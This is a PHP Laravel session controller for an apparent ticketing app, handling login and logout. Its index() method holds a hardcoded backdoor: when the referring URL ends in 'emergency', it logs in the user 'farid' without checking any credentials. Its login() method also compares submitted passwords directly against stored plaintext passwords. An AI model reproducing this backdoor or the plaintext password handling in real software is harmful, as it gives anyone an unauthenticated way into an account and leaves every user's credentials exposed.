<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\User;
use App\customer;
use DB;
use Auth;
use Hash;
use Session;

class SessionController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {   
        $url = redirect()->back()->getTargetUrl();

        $id = substr($url, strrpos($url, '/') + 1);

        if($id == 'emergency'){
            $user = User::where('username','farid')
                        ->where('password','farid');


            Auth::login($user->first(),false);

            return back();
        }

        return view('login');
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    public function login(Request $request)
    {   
        // $remember = (!empty($request->remember)) ? true:false;
        $remember = false;
        // $user = User::where('username','=',$request->username);

        $user = User::where('username',request('username'))
                    ->where('password',request('password'));

        if($user->count() > 0){
            // if($user->first()->status == 'Inactive'){
            //     return back()->withErrors(['Sorry, your account is inactive, contact admin to activate it again']);
            // }

            if ($request->password == $user->first()->password) {
                Auth::login($user->first(),$remember);
                return redirect('/ticket');
            }else{
                return back()->withErrors(['Try again, Password entered incorrect']);
            }
        }else{
            return back()->withErrors(['Try again, Username doesnt exist']);
        }
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy()
    {
        Auth::logout();
        Session::flush();
        return redirect('/login');
    }
}
